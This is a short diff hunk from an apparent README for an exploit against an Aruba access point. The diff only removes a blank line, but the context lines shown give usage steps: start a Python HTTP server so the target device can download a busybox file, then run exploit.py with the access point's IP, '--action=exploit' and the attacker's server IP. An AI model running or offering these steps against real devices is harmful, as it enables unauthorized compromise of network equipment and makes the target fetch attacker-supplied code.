@@ -426,7 +426,6 @@ python3 -m http.server 8888
 ```
 
 This step is to start an http server server for the device to download the busybox file<br>
-
 **Step 3:**  Open a new command line terminal under the exploit file and execute the following command
 ```
 python exploit.py --aruba_ap_ip=10.0.4.102 --action=exploit --exploit_http_server_ip=10.0.4.54
